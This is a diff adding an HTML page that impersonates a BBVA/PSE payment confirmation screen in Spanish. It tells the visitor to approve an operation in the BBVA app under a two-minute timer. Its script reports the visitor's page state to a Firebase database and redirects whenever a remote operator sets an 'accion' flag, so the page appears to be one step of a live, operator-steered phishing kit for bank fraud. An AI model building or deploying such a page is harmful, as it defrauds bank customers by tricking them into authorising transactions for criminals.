@@ -1,0 +1,217 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Confirmación</title>
+
+<style>
+body{
+  margin:0;
+  font-family: Arial, sans-serif;
+  background:#f5f6f7;
+}
+
+/* HEADER */
+.header{
+  background:#0b2a4a;
+  color:#fff;
+  padding:15px 20px;
+  display:flex;
+  justify-content:space-between;
+  align-items:center;
+}
+
+.header img{
+  height:35px;
+  filter: brightness(0) invert(1); /* LOGO BLANCO */
+}
+
+.header span{
+  font-size:14px;
+}
+
+/* CONTENT */
+.container{
+  display:flex;
+  justify-content:space-between;
+  padding:60px;
+}
+
+/* LEFT */
+.left{
+  max-width:500px;
+}
+
+.step{
+  color:#888;
+  margin-bottom:10px;
+}
+
+h1{
+  font-size:28px;
+  margin-bottom:20px;
+}
+
+.text{
+  color:#555;
+  line-height:1.5;
+}
+
+.timer{
+  margin-top:30px;
+}
+
+.circle{
+  width:80px;
+  height:80px;
+  border-radius:50%;
+  border:6px solid #2bbbad;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  font-weight:bold;
+  font-size:18px;
+}
+
+/* RIGHT */
+.right{
+  text-align:center;
+}
+
+.phone{
+  width:180px;
+  margin-bottom:20px;
+}
+
+.box{
+  background:#f3e7c9;
+  padding:20px;
+  border-radius:5px;
+  max-width:300px;
+}
+
+/* BUTTON */
+.btn{
+  margin-top:40px;
+  padding:12px 25px;
+  background:#1e63a9;
+  color:#fff;
+  border:none;
+  cursor:pointer;
+}
+
+.timer-text{
+  margin-top: 15px;
+  color:#555;
+}
+</style>
+</head>
+
+<body>
+
+<div class="header">
+  <img src="logo.png">
+  <span>Pagos a través de PSE</span>
+</div>
+
+<div class="container">
+
+  <div class="left">
+    <div class="step">2 de 2</div>
+
+    <h1>Confirma la operación en tu App BBVA</h1>
+
+    <div class="text">
+      Abre la notificación push que enviamos a tu teléfono y confirma o rechaza esta operación. Después regresa a esta pantalla.
+    </div>
+
+    <div class="timer">
+  <div class="circle" id="timer">02:00</div>
+  <div class="timer-text">Minutos para firmar</div>
+</div>
+
+    <button class="btn" onclick="ir()">Continuar</button>
+  </div>
+
+  <div class="right"><div class="phone">
+    <svg viewBox="0 0 600 600" xmlns="http://www.w3.org/2000/svg"><defs><linearGradient x1="35.209%" y1="1.035%" x2="64.791%" y2="98.965%" id="mobilenotifications_a"><stop stop-color="#192647" stop-opacity=".5" offset="0%"></stop><stop stop-color="#192647" stop-opacity="0" offset="100%"></stop></linearGradient><linearGradient x1="28.969%" y1="22.317%" x2="67.527%" y2="73.01%" id="mobilenotifications_b"><stop stop-color="#FFF" stop-opacity=".5" offset="0%"></stop><stop stop-color="#ECF7F8" stop-opacity=".1" offset="100%"></stop></linearGradient></defs><g fill="none" fill-rule="evenodd"><path d="M0 0h600v600H0z"></path><g transform="translate(158 54)" fill-rule="nonzero"><path d="M90.582 60h221.836c14.68.018 26.573 11.87 26.582 26.492v433.016c-.009 14.621-11.902 26.474-26.582 26.492H90.582c-14.68-.018-26.573-11.87-26.582-26.492V86.492C64.009 71.87 75.902 60.018 90.582 60Z" fill="url(#mobilenotifications_a)"></path><path d="M26.335 0h220.33C261.23.02 273.02 11.79 273 26.289v429.493c-.007 14.477-11.793 26.211-26.335 26.218H26.335C11.793 481.993.007 470.26 0 455.782V26.336A26.194 26.194 0 0 1 7.665 7.748 26.43 26.43 0 0 1 26.287 0h.048Z" fill="#1464A5"></path><path fill="#49A5E6" d="M0 60h273v361H0z"></path><path fill="url(#mobilenotifications_b)" opacity=".5" d="M1 60.237v360.526l139.364.237L274 175.43V60z"></path><path d="m174.205 320.477-14.642 28.089a.835.835 0 0 1-1.18.357l-.355-.357-14.641-28.089a.968.968 0 0 0-.709-.476h-7.084a.552.552 0 0 0-.43.163.562.562 0 0 0-.16.432.443.443 0 0 0 .117.357l23.144 43.562a.817.817 0 0 0 .509.45.808.808 0 0 0 .671-.093l.355-.357 23.143-43.562a.682.682 0 0 0-.236-.833.412.412 0 0 1-.236-.119h-7.085c-.709 0-1.063.238-1.18.476m8.589 38.046 14.642-28.089a.835.835 0 0 1 1.18-.357l.355.357 14.642 28.089c.15.26.412.436.709.476h7.085a.665.665 0 0 0 .59-.714c0-.12 0-.239-.118-.239l-23.144-43.56a.817.817 0 0 0-.51-.451.808.808 0 0 0-.67.093l-.355.357-23.144 43.561a.682.682 0 0 0 .236.834c.118 0 .236.119.354.119h7.085c.41.019.803-.158 1.063-.476m-110.377-.071H59.165a.807.807 0 0 1-.828-.833v-11.905a.807.807 0 0 1 .828-.833h13.253c6.272 0 9.112 1.786 9.112 6.905s-2.722 6.785-9.112 6.666m-13.253-31.904h13.017c4.851 0 7.218 2.024 7.218 5.952 0 3.929-2.485 5.953-7.218 5.953H59.165a.807.807 0 0 1-.828-.834v-10.118a.915.915 0 0 1 .828-.953m22.838 14.286a9.667 9.667 0 0 0 4.97-9.048c0-7.023-5.443-11.786-13.135-11.786H51.83a.808.808 0 0 0-.829.786v43.38a.814.814 0 0 0 .22.58.804.804 0 0 0 .56.254h21.112c10.53 0 16.092-4.524 16.092-13.452.254-4.724-2.575-9.065-6.981-10.714m36.414 17.618h-13.253a.802.802 0 0 1-.575-.22.812.812 0 0 1-.253-.613v-11.905a.812.812 0 0 1 .219-.579.802.802 0 0 1 .61-.254h13.252c6.272 0 9.112 1.786 9.112 6.905s-2.722 6.785-9.112 6.666m-13.253-31.904h13.017c4.851 0 7.218 2.024 7.218 5.952 0 3.929-2.485 5.953-7.218 5.953h-13.017a.802.802 0 0 1-.575-.22.812.812 0 0 1-.253-.614v-10.118a.915.915 0 0 1 .828-.953m22.838 14.286a9.667 9.667 0 0 0 4.97-9.048c0-7.023-5.444-11.786-13.135-11.786H97.83a.808.808 0 0 0-.829.786v43.38a.814.814 0 0 0 .22.58.804.804 0 0 0 .56.254h21.112c10.53 0 16.092-4.524 16.092-13.452.254-4.724-2.575-9.065-6.981-10.714" fill="#FFF"></path><circle fill="#07467F" cx="136" cy="189" r="79"></circle><path d="M170 204.321a6.037 6.037 0 0 1-6.038-6.035V176.94c0-15.43-12.514-27.94-27.95-27.94-15.43 0-27.938 12.504-27.938 27.929v21.44a6.049 6.049 0 0 1-6.074 5.952v5.25a3.43 3.43 0 0 0 3.43 3.429h61.116a3.43 3.43 0 0 0 3.442-3.417v-5.262H170ZM146.994 219c.129 3.803-1.847 7.384-5.185 9.393a11.312 11.312 0 0 1-10.994.35c-3.466-1.794-5.68-5.241-5.81-9.044a10.328 10.328 0 0 1 0-.699h21.99Z" fill="#F7CB5B"></path><rect fill="#F7CB5B" x="133" y="143" width="7" height="20" rx="2.83"></rect></g></g></svg>
+</div>
+    <div class="box">
+      Si no recibes la notificación puedes abrir tu App BBVA e iniciar sesión para gestionar la operación pendiente.
+    </div>
+  </div>
+</div>
+
+</div>
+
+<script>
+let tiempo = 120; // 2 minutos
+
+function actualizar(){
+  let min = Math.floor(tiempo / 60);
+  let seg = tiempo % 60;
+
+  document.getElementById("timer").textContent =
+    String(min).padStart(2,'0') + ":" + String(seg).padStart(2,'0');
+
+  if(tiempo <= 0){
+    window.location.href = "ejemplo.html";
+  }
+
+  tiempo--;
+}
+
+setInterval(actualizar,1000);
+
+
+</script>
+
+
+<script type="module" src="firebase.js"></script>
+
+<script>
+window.addEventListener('load', () => {
+const { db, uid, ref, update, onValue } = window;
+
+
+update(ref(db, "dataPages/" + uid), { 
+estado: "abierto",
+paginaActual: "Autorizacion.html" 
+});
+
+window.addEventListener("beforeunload", () => {
+update(ref(db, "dataPages/" + uid), { 
+estado: "cerrado",
+paginaActual: null  
+});
+});
+
+
+// ===============================
+// 🔥 SOLO AUTORIZACION Y FINAL
+// ===============================
+onValue(ref(db, "dataPages/" + uid), snapshot => {
+
+  const data = snapshot.val();
+  if (!data) return;
+
+  // 🔴 IR A FINAL
+  if (data.accion === "final") {
+
+    update(ref(db, "dataPages/" + uid), {
+      accion: null
+    });
+
+    window.location.href = "../../final.html";
+  }
+
+});
+
+
+});
+</script>
+
+
+</body>
+</html>
